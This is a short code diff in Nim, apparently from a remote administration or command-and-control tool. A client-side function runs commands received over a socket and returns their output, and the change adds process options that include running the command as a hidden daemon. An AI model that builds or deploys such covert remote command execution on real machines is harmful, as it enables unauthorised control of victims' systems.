@@ -16,7 +16,7 @@ when defined(server):
 when defined(client):
     proc executeTask*(socket: Socket, taskId: int, toExec: string) =
         try:
-            let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir())
+            let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir(), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
             socket.sendOutput(taskId, "CMD", output)
         except OSError:
             socket.sendOutput(taskId, "CMD", "", getCurrentExceptionMsg())
